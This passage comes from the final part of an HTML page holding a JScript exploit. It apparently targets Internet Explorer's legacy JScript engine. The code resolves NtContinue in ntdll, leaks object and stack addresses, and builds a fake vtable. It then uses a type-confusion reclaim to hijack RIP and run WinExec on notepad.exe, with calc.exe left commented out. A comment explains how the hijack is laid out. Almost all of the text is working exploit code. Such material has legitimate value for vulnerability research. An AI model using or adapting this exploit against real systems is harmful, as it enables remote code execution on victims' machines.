                                
                                var NtdllImportX = ExtractBaseFromImports(MsvcrtBase, [0x6c64746e, 0x6c642e6c]);
                                var NtdllBase = DiveModuleBase(NtdllImportX);
                                DebugLog("Ntdll base: 0x" + NtdllBase.hi.toString(16) + NtdllBase.lo.toString(16));
                                var NtContinueAddress = ResolveExport(NtdllBase, [0x6f43744e, 0x6e69746e]);
                                DebugLog("Successfully resolved NtContinue at at 0x" + NtContinueAddress.hi.toString(16) + NtContinueAddress.lo.toString(16));
                                
                                // Build the fake vtable
                                
                                //var CommandStr = "\u3a43\u575c\u6e69\u6f64\u7377\u535c\u7379\u6574\u336d\u5c32\u6163\u636c\u652e\u6578"; // calc.exe
								//var CommandStr = "\u6f6e\u6574\u6170\u0064"; // on et ap d
								var CommandStr = "\u3a63\u775c\u6e69\u6f64\u7377\u6e5c\u746f\u7065\u6461\u652e\u6578"; // C:\Windows\notepad.exe
                                CommandStr = CommandStr.substr(0, CommandStr.length);
                                CommandStrAddress = LeakObjectAddress(LeakedVvalAddress, CommandStr);
                                DebugLog("Successfully resolved command string address at at 0x" + CommandStrAddress.hi.toString(16) + CommandStrAddress.lo.toString(16));
                                
                                leak_obj = new Object(); // Create an object
                                obj_addr = LeakObjectAddress(LeakedVvalAddress, leak_obj); // Get address
                                csession_addr = LeakQword(from_int52(to_int52(obj_addr.hi, obj_addr.lo + 24))); // Get CSession from offset 24
                                stack_addr_lower = LeakDword(from_int52(to_int52(csession_addr.hi, csession_addr.lo + 80))); // Get the lower half of the stack pointer from offset 80
                                stack_addr_upper = LeakDword(from_int52(to_int52(csession_addr.hi, csession_addr.lo + 84))); // Get the upper half of the stack pointer from offset 84
                                var LeakedStackPtr = from_int52(to_int52(stack_addr_upper, stack_addr_lower + 0x8)); // Stack alignment is very important, I was getting an access violation from the MOVDQA within CreateProcessA after NtContinue -> WinExec
                                DebugLog("Successfully leaked stack pointer address at 0x" + LeakedStackPtr.hi.toString(16) + LeakedStackPtr.lo.toString(16));
                                var PaddingSize = 3000;
                                var FakeVtable = "";//Array(PaddingSize + 1).join('A'); // Adds lots of stack space to either side to prevent
                                var Y = 0;
                                
                                while (FakeVtable.length < 0x400) {
                                    if(Y == 0x138) {
                                        FakeVtable += ConvertDwordArrayToBytes([NtContinueAddress.lo]);
                                    }
                                    else if(Y == 0x13C) {
                                        FakeVtable += ConvertDwordArrayToBytes([NtContinueAddress.hi]);
                                    }
                                    else {
                                        FakeVtable += ConvertDwordArrayToBytes([0x11111111]);
                                    }
                                    
                                    Y += 4;
                                }
                                
                                FakeVtable = FakeVtable.substr(0, FakeVtable.length);
                                var FakeVtableAddress = LeakObjectAddress(LeakedVvalAddress, FakeVtable);
                                //DebugLog("Successfully resolved fake vtable address at 0x" + FakeVtableAddress.hi.toString(16) + FakeVtableAddress.lo.toString(16));
                                var MutableVarAddress = from_int52(to_int52(LeakedVvalAddress.hi, LeakedVvalAddress.lo + 0x40));
                                var FakeObjAddress = from_int52(to_int52(LeakedVvalAddress.hi, LeakedVvalAddress.lo + 96));
                                // 96 is the 64 prop name offset plus size of mutable VAR and next VAR Type field.
                                var RipHijackPropname = CreateVar64(0x81, LeakedVvalAddress.lo + 96, LeakedVvalAddress.hi, 0, 0) + CreateVar64(0, FakeVtableAddress.lo, FakeVtableAddress.hi, 0, 0) + generate_context(CommandStrAddress, LeakedStackPtr, WinExecAddress);
                                RipHijackPropname = RipHijackPropname.substr(0, RipHijackPropname.length);
                                ReClaimNameList(0, RipHijackPropname);
                                DebugLog("Executing typeof method in mutable var at 0x" + MutableVarAddress.hi.toString(16) + MutableVarAddress.lo.toString(16) + " pointing at fake object (which starts with fake vtable pointer) at 0x" + FakeObjAddress.hi.toString(16) + FakeObjAddress.lo.toString(16) + " which should contain a vtable pointer to 0x" +FakeVtableAddress.hi.toString(16) + FakeVtableAddress.lo.toString(16));
                                typeof MutableVar;
                                DebugLog("Clean return from shellcode");
                                
                                /*
                                
                                So what is the anatomy of the RIP hijack?
                                1. Mutable var is set to a 0x81 object reference. Thus accessing it, will cause the VAR at its obj_ptrr to be accessed instead.
                                2. At offset 96 from the start of the mutable var at the start of the property name, is the fake object. Its most important field is its vtable pointer, which points into the fake vtable region passed the padding.
                                3. The fake vtable contains a typeof method pointer to NtContinue.
                                
                                Fake vtable:
                                
                                [Padding]
                                [Empty methods]
                                [Typeof method] -> NtContinue
                                
                                Property name:
                                
                                [Mutable var]
                                [Empty 0 Type for fake VAR]
                                [Vtable pointer] <- RCX points here
                                [CONTEXT]
                                */
                            }
                            else {
                                DebugLog("Failed to identify Kernel32.dll base address via import " + Kernel32ImportX.toString(16));
                            }
                        }
                        else {
                            DebugLog("Failed to identify raandom kernel32.dll import address from JScript.dll IAT");
                        }
                    }
                    else {
                        DebugLog("Failed to leak JScript.dll base address");
                    }
                }
                else {
                    DebugLog("Memory leak test failed");
                }
            }
            else {
                DebugLog("Failed to verify mutable variable modification via re-claim");
            }
        }
        else {
            DebugLog("Failed to extract final VVAL index via re-claim");
        }
    }
    else {
        DebugLog("Leaked anchor object type confusion re-claim failed");
    }
}

Exploit();

</script>
</head>
</html>